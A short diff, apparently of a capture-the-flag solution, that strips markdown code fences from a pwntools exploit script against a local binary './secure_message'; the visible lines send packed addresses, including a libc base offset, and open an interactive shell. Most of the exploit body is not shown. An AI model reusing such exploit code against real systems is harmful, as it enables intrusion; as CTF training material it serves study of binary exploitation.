@@ -1,4 +1,3 @@
-```
 from pwn import *
 
 elf = ELF('./secure_message')
@@ -90,4 +89,4 @@ p.send(p64(0xbeefdead000))
 p.send(p64(libc_base+0x4f440))
 
 p.interactive()
-```
+
